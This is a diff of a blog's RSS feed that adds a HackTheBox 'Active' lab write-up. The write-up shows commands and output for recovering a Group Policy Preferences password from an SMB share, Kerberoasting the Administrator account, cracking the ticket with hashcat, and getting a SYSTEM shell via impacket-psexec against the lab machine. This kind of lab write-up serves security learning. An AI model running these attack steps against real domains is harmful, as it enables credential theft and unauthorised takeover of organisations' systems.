@@ -5,7 +5,286 @@
     <link>https://fahmifj.github.io/tags/windows/</link>
     <description>Recent content in Windows on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 10 Jul 2021 20:28:32 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 15 Jul 2021 13:17:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Active</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-active/</link>
+      <pubDate>Thu, 15 Jul 2021 13:17:29 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-active/</guid>
+      <description>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</description>
+      <content:encoded><![CDATA[<p>Active is an easy Windows machine from HackTheBox which as the name implies features an Active Directory system. It starts off by enumerating an SMB share to find a set of credentials from Group Policy Preferences (GPP). With these credentials, enumeration of LDAP service reveals that the administrator account has a SPN attribute of a CIFS service. This leads to a Kerberoasting attack which allows me obtain the administrator password hash and crack it to obtain a shell access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Active Directory GPP</li>
+<li>Kerberoasting</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Impacket</li>
+<li>CrackMapExec</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan (after  <code>-p-</code> performed) discovers a bunch of open ports. The most notables ports are: 53 (DNS), 88 (Kerberos), 139-445 (SMB/RPC), and 389 (LDAP). According to these open ports, I can safely assume this is an Active Directory (as the box name implies).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,04915,49169,49172,49180 -sC -sV -oA nmap/10-tcp-allport-script-active 10.10.10.100
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 23:20 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.100
+Host is up <span style="color:#f92672">(</span>0.072s latency<span style="color:#f92672">)</span>.
+
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2021-07-11 03:20:53Z<span style="color:#f92672">)</span>
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp   open   microsoft-ds?
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: active.htb, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp  open   tcpwrapped
+4915/tcp  closed frcs
+5722/tcp  open   msrpc         Microsoft Windows RPC
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open   msrpc         Microsoft Windows RPC
+49153/tcp open   msrpc         Microsoft Windows RPC
+49154/tcp open   msrpc         Microsoft Windows RPC
+49155/tcp open   msrpc         Microsoft Windows RPC
+49157/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49169/tcp open   msrpc         Microsoft Windows RPC
+49172/tcp open   msrpc         Microsoft Windows RPC
+49180/tcp open   msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 4s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-07-11T03:21:48
+|_  start_date: 2021-07-09T05:18:19
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 71.11 seconds
+</code></pre></div><p><code>nmap</code> identified the domain name as <code>active.htb</code> and the OS version to be Windows Server 2008, which most likely vulnerable to ZeroLogon (CVE-2020-1472) as well as PrintNightmare (CVE-2021-1675/CVE-2021-34527). But, I&rsquo;ll consider these vulns as alternative methods and put them in separate post.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-53---dns">TCP 53 - DNS</h3>
+<p>There is no zone transfer in this machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ dig axfr @10.10.10.100 10.10.10.100
+
+; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; axfr @10.10.10.100 10.10.10.100
+; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+;; global options: +cmd
+; Transfer failed.
+</code></pre></div><h3 id="tcp-139445---smb">TCP 139,445 - SMB</h3>
+<p><code> smbmap</code> identifies that anonymous logon is allowed and it has read access on  <code>Replication</code> share.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ smbmap -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -H 10.10.10.100
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.100:445        Name: active.htb                                        
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  NO ACCESS       Logon server share 
+        Users                                                   NO ACCESS
+</code></pre></div><h4 id="replication-share">Replication Share</h4>
+<p>The <code>Replication</code> share contains a lot of folders, so I&rsquo;ll just download them recursively.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ smbclient -N //10.10.10.100/Replication
+Anonymous login successful
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+  active.htb                          D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 06:37:44 <span style="color:#ae81ff">2018</span>
+
+                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5722238</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> recurse on
+smb: <span style="color:#ae81ff">\&gt;</span> prompt of
+smb: <span style="color:#ae81ff">\&gt;</span> mget * 
+getting file <span style="color:#ae81ff">\a</span>ctive.htb<span style="color:#ae81ff">\P</span>olicies<span style="color:#ae81ff">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span><span style="color:#ae81ff">\G</span>PT.INI of size <span style="color:#ae81ff">23</span> as active.htb/Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/GPT.INI <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><p>The only interesting file there is the <code>Groups.xml</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ find . -type f -iname groups.xml                                                                            
+./Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups/Groups.xml
+</code></pre></div><p>This <code>groups.xml</code> contains a <code>cpassword</code> of user <code>active.htb\SVC_TGS</code>, and I&rsquo;ll note them,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ cat ./Policies/<span style="color:#f92672">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span style="color:#f92672">}</span>/MACHINE/Preferences/Groups/Groups.xml
+&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>?&gt;
+&lt;Groups clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span>&gt;&lt;User clsid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span> image<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span> changed<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span> uid<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span>&gt;&lt;Properties action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;U&#34;</span> newName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> fullName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> cpassword<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span> changeLogon<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> noChange<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> neverExpires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> acctDisabled<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> userName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span>/&gt;&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83»  
+$ ldapsearch -LLL -x -h 10.10.10.100 -s base namingContexts 
+dn:
+namingContexts: DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+namingContexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+namingContexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+namingContexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+namingContexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
+$ ldapsearch -LLL -x -h 10.10.10.100 -b <span style="color:#e6db74">&#34;dc=active,dc=htb&#34;</span> 
+Operations error <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+Additional information: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="access-as-svc_tgs">Access as SVC_TGS</h3>
+<h4 id="group-policy-preferences-gpp---password-decrypt">Group Policy Preferences (GPP) - Password Decrypt</h4>
+<p>In Windows Server 2008, Microsoft introduced a feature called <strong>Group Policy Preferences</strong>. This feature allows various Windows configurations/settings, including changing local administrator passwords, to be distributed to domain-joined computers. When a GPP is created, it also creates an associated XML file in SYSVOL share. Some of the XML files created contains a set of credentials encrypted with AES-256. However, Microsoft <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">published the encryption key</a> which can be used to decrypt the password (<code>cpassword</code>) in the XML file.</p>
+<p>Kali comes with a tool called <code>gpp-decrypt</code>, and this tool can be used to decrypt the <code>cpassword</code> I obtained from the <code>Groups.xml</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ          
+GPPstillStandingStrong2k18
+</code></pre></div><h4 id="users-share">Users Share</h4>
+<p><code>CrackMapExec</code> confirms that the credentials (<code>SVC_TGS:GPPstillStandingStrong2k18</code>) are valid. I have read access now on the three other shares.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ crackmapexec smb active.htb -u <span style="color:#e6db74">&#39;SVC_TGS&#39;</span> -p <span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> --shares
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 6.1 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:active.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> active.htb<span style="color:#ae81ff">\S</span>VC_TGS:GPPstillStandingStrong2k18 
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Share           Permissions     Remark
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               -----           -----------     ------
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               C$                              Default share
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               IPC$                            Remote IPC
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Replication     READ            
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.100    <span style="color:#ae81ff">445</span>    DC               Users           READ  
+</code></pre></div><p>Looking into the  <code>Users</code> share, I&rsquo;m sure this share is most likely <code>C:\Users\</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active.htb» «10.10.14.83» 
+$ smbclient -N //10.10.10.100/Users -U <span style="color:#e6db74">&#39;SVC_TGS%GPPstillStandingStrong2k18&#39;</span>
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                  DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+  ..                                 DR        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 10:39:20 <span style="color:#ae81ff">2018</span>
+  Administrator                       D        <span style="color:#ae81ff">0</span>  Mon Jul <span style="color:#ae81ff">16</span> 06:14:21 <span style="color:#ae81ff">2018</span>
+  All Users                       DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+  Default                           DHR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 02:38:21 <span style="color:#ae81ff">2009</span>
+  Default User                    DHSrn        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 01:06:44 <span style="color:#ae81ff">2009</span>
+  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+  Public                             DR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 00:57:55 <span style="color:#ae81ff">2009</span>
+  SVC_TGS                             D        <span style="color:#ae81ff">0</span>  Sat Jul <span style="color:#ae81ff">21</span> 11:16:32 <span style="color:#ae81ff">2018</span>
+
+                <span style="color:#ae81ff">10459647</span> blocks of size 4096. <span style="color:#ae81ff">5722238</span> blocks available
+</code></pre></div><p>And there is a user flag in <code>SVC_TGS\Desktop</code>. I can read the flag with <code>more</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">smb: \&gt; ls SVC_TGS\Desktop\
+  .                                   D        0  Sat Jul 21 11:14:42 2018
+  ..                                  D        0  Sat Jul 21 11:14:42 2018
+  user.txt                            A       34  Sat Jul 21 11:06:25 2018
+
+                10459647 blocks of size 4096. 5722238 blocks available
+smb: \&gt; more SVC_TGS\Desktop\user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as /tmp/smbmore.uhunaP (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+</code></pre></div><p><img class="img-container" src="imgs/image-20210711104959070.png" alt="image-20210711104959070"  />
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\SYSTEM</h3>
+<h4 id="ldap---spn-enumeration">LDAP - SPN enumeration</h4>
+<p>With <code>SVC_TGS</code> credentials, I&rsquo;m able to access the LDAP service.</p>
+<p>It was found that the administrator has <code>servicePrincipalName</code> attribute.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.83» 
+$ ldapsearch -LLL -x -D <span style="color:#e6db74">&#39;SVC_TGS@active.htb&#39;</span> -w <span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> -h 10.10.10.100 -b <span style="color:#e6db74">&#34;dc=active,dc=htb&#34;</span> <span style="color:#e6db74">&#34;(&amp;(objectClass=user)(objectCategory=user)(servicePrincipalName=*))&#34;</span> 
+dn: CN<span style="color:#f92672">=</span>Administrator,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+adminCount: <span style="color:#ae81ff">1</span>
+accountExpires: <span style="color:#ae81ff">0</span>
+logonCount: <span style="color:#ae81ff">34</span>
+sAMAccountName: Administrator
+sAMAccountType: <span style="color:#ae81ff">805306368</span>
+servicePrincipalName: active/CIFS:445
+objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h4 id="kerberoasting">Kerberoasting</h4>
+<p><strong>Kerberoasting</strong> is an attack against Kerberos to steal a Service Ticket. The attack is well explained in <a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">this blog</a> and <a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">this one</a>.</p>
+<p>The following image created by <a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">David Freimannis</a> shows an overview of Kerberos authentication process. The red box indicates the <strong>Kerberoasting</strong> attack.</p>
+<p><img class="img-container" src="imgs/image-20210715120848088.png" alt="image-20210715120848088"  title="Kerberos Mechanism"  />
+</p>
+<center><small>Taken from “Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System” by David Freimanis</small></center>
+<p>In the image above, step number 4, the client/user will obtains a Ticket Granting Service (TGS) ticket. This ticket is encrypted with NTLM hash (derived from password) of a service account. If the client itself has been compromised, an attacker could easily steal the ticket and attempt an offline brute-force to recover the password from the ticket.</p>
+<p>For example, let&rsquo;s start from step 3 and say we want to access a CIFS service. The server (KDC) then searches for SPN of CIFS service, which in this case is <code>active/CIFS:445</code> and <strong>it is tied</strong> to the Administrator account. Once the SPN is found, server will issue a TGS ticket encrypted with NTLM hash of the Administrator account and send the ticket to the client. Now that we have the TGS ticket, but instead of using the ticket to authenticate to the CIFS service, we keep that ticket and attempt a brute-force against it to obtain the administrator password.</p>
+<blockquote>
+<p>If the SPN is tied to a computer account, it would be almost impossible to crack the TGS ticket since a computer account password is a random 128 character.</p>
+</blockquote>
+<p>There are several tools out there that can be used to perform a Kerberoasting attack, but I&rsquo;ll the one from Impacket called <code>Impacket-GetUserSPNs</code>. The tools captures the ticket and automatically formats it into hashcat crackable format.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «active» «10.10.14.75» 
+$ impacket-GetUserSPNs active.htb/SVC_TGS:<span style="color:#e6db74">&#39;GPPstillStandingStrong2k18&#39;</span> -dc-ip 10.10.10.100 -request-user administrator
+Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN<span style="color:#f92672">=</span>Group Policy Creator Owners,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>active,DC<span style="color:#f92672">=</span>htb  2018-07-18 15:06:40.351723  2021-07-14 12:36:18.277545             
+
+
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$92c75d0a49cbaf166e656a7350827d0c$a775e30...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h4 id="tgs-crack">TGS Crack</h4>
+<p>The password of the TGS can be recovered using hashcat.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span style="color:#ae81ff">13100</span> hashes/svc_tgs.krbhash ../../rockyou.txt -O
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$92c75d0a49cbaf166e656a7350827d0c$a775e30...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...:Ticketmaster1968
+</code></pre></div><p>It is  <code>Ticketmaster1968</code>.</p>
+<h4 id="impacket-psexec">Impacket-psexec</h4>
+<p>Using the administrator account along with the obtained password, I&rsquo;m able to get a shell as local system using <code>impacket-psexec</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
+$ impacket-psexec active.htb/administrator:<span style="color:#e6db74">&#39;Ticketmaster1968&#39;</span>@10.10.10.100
+Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.10.100.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file olAAJsqj.exe
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.10.100.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service mvjR on 10.10.10.100.....
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service mvjR.....
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami <span style="color:#f92672">&amp;&amp;</span> ipconfig
+nt authority<span style="color:#ae81ff">\s</span>ystem
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.10.100
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+
+Tunnel adapter isatap.<span style="color:#f92672">{</span>B3FEC2C7-47CA-4014-A441-A3A5CDDC983C<span style="color:#f92672">}</span>:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+</code></pre></div><p>The root flag is done here.</p>
+<pre><code>C:\Windows\system32&gt;type \Users\Administrator\Desktop\root.txt
+b5fc76...[SNIP]...
+</code></pre><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></li>
+<li><a href="https://hebo.gitbook.io/hackbook/active-directory/kerberoasting">https://hebo.gitbook.io/hackbook/active-directory/kerberoasting</a></li>
+<li><a href="https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/">https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/</a></li>
+<li><a href="http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf">http://www.diva-portal.se/smash/get/diva2:1358687/FULLTEXT01.pdf</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Atom</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
@@ -278,9 +557,9 @@ pk:ids:MetaDataClass
 $57
 pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
 </code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
